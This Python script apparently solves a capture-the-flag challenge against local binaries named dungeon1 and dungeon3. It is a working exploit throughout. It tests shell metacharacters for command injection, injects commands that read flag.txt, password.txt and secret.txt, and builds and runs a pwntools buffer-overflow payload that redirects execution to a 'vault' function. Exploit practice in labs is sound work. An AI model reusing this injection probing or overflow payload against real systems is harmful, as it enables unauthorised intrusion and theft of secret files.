#!/usr/bin/env python3

import subprocess
import os
import re
from pwn import *

def execute_command(cmd):
    try:
        print(f"Executing command: {cmd}")
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        print(f"Command output: {result}")
        return result
    except subprocess.CalledProcessError as e:
        print(f"Command failed with output: {e.output.decode('utf-8', errors='ignore')}")
        return e.output.decode('utf-8', errors='ignore')
    except subprocess.TimeoutExpired:
        print("Command timed out")
        return "TIMEOUT"

def execute_payload(binary_name, payload_path):
    cmd = f'cat {payload_path} | ./{binary_name}'
    return execute_command(cmd)

def check_injection(binary_name):
    symbols = ["|", "$(", "`", "&&", ";"]
    
    for symbol in symbols:
        payload = f"{symbol} echo VULNERABLE {symbol if symbol != '|' else ''}"
        output = execute_command(f'echo "{payload}" | ./{binary_name}')
        if 'VULNERABLE' in output:
            print(f"Command injection vulnerability found with payload: {payload}")
            return symbol
    
    print("No obvious command injection vulnerability found. Proceeding with advanced techniques.")
    return None

def fuzz_binary(binary_name, injection_symbol):
    files = ['flag.txt', 'password.txt', 'secret.txt']
    for file in files:
        payload = f"{injection_symbol} cat {file} {injection_symbol if injection_symbol != '|' else ''}" if injection_symbol else f"cat {file}"
        output = execute_command(f'echo "{payload}" | ./{binary_name}')
        if output and output != "TIMEOUT":
            if "No such file or directory" not in output and not output.lower().startswith('sh:'):
                print(f"Sensitive data found with payload: {payload}")
                print(f"Output: {output.strip()}")
                return True
    
    print("Flag not found, please continue your analysis.")
    return False

def analyze_functions(binary_name):
    try:
        output = subprocess.check_output(["gdb", "-q", "-ex", f"file {binary_name}", "-ex", "info functions", "-ex", "quit"]).decode()
        functions = re.findall(r'0x[0-9a-fA-F]+ <(\w+)>', output)
        return functions
    except subprocess.CalledProcessError as e:
        print(f"Error analyzing functions: {e.output.decode('utf-8', errors='ignore')}")
        return []

def get_function_address(binary_name, function_name):
    try:
        output = subprocess.check_output(["gdb", "-q", "-ex", f"file {binary_name}", "-ex", f"info address {function_name}", "-ex", "quit"]).decode()
        match = re.search(r'0x[0-9a-fA-F]+', output)
        if match:
            return match.group(0)
    except subprocess.CalledProcessError as e:
        print(f"Error getting function address: {e.output.decode('utf-8', errors='ignore')}")
    return None

def buffer_overflow_exploit(binary_name):
    vault_address = get_function_address(binary_name, "vault")
    if vault_address is None:
        print("No vault function found, cannot perform buffer overflow exploit.")
        return

    offset = 40  # 32 bytes buffer + 8 bytes saved RBP
    payload = b"A" * offset + p64(int(vault_address, 16))

    print(f"Payload length: {len(payload)}")
    print(f"Payload content: {payload}")

    # Write the payload to a file
    payload_path = "payload.txt"
    with open(payload_path, "wb") as f:
        f.write(payload)

    print("Payload created and written to payload.txt.")
    print(f"Vault function address: {vault_address}")

    # Automatically run the exploit
    print("Running the exploit...")
    os.system(f'cat {payload_path} | ./{binary_name}')
    print("Exploit run.")

def analyze_binary(binary_name):
    injection_symbol = check_injection(binary_name)
    if injection_symbol:
        if not fuzz_binary(binary_name, injection_symbol):
            print("Proceeding with buffer overflow analysis...")
            buffer_overflow_exploit(binary_name)
    else:
        buffer_overflow_exploit(binary_name)

def main():
    while True:
        choice = input("Which binary do you want to analyze? (1 for dungeon1, 2 for dungeon3, q to quit): ")
        if choice == '1':
            binary_name = "dungeon1"
        elif choice == '2':
            binary_name = "dungeon3"
        elif choice.lower() == 'q':
            print("Exiting.")
            break
        else:
            print("Invalid choice. Please enter 1, 2, or q.")
            continue

        if not os.path.exists(binary_name):
            print(f"Error: {binary_name} not found.")
            continue

        analyze_binary(binary_name)

if __name__ == "__main__":
    main()

